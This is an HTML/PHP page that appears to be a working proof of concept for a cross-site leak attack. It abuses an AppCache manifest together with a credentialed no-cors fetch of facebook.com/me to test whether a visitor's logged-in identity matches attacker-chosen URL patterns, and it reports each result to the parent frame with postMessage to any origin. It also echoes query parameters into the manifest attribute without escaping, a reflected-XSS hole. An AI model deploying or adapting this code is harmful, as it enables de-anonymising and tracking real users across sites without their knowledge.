<html manifest="manifest.php?patternA=<?php echo $_GET["patternA"]; ?>&patternB=<?php echo $_GET["patternB"]; ?>&prefix=<?php echo $_GET["prefix"]; ?>">
	<head>
		<meta http-equiv="origin-trial" content="AuCtu04xtTGLZdzKD7o/HSPRnWr37VcR1464J3oBHredagkjDc7rJn4zveP6ukgz8FMbaTo8CpCtTVSfYfzrgwIAAABJeyJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjgwIiwiZmVhdHVyZSI6IkFwcENhY2hlIiwiZXhwaXJ5IjoxNjMzNDc4Mzk5fQ==">
	</head>
	<body>
		<script>
			let patternA = new URL(location).searchParams.get("patternA");
			let patternB = new URL(location).searchParams.get("patternB");
			let prefix   = new URL(location).searchParams.get("prefix") || "";

			applicationCache.addEventListener("cached", () => {
				fetch("https://www.facebook.com/me", {
					mode: "no-cors",
					credentials: "include"
				}).then(() => {
					top.postMessage({patternA, patternB, prefix, match: true}, "*");
				}).catch(() => {
					top.postMessage({patternA, patternB, prefix, match: false}, "*");
				});
			});
        </script>
    </body>
</html>
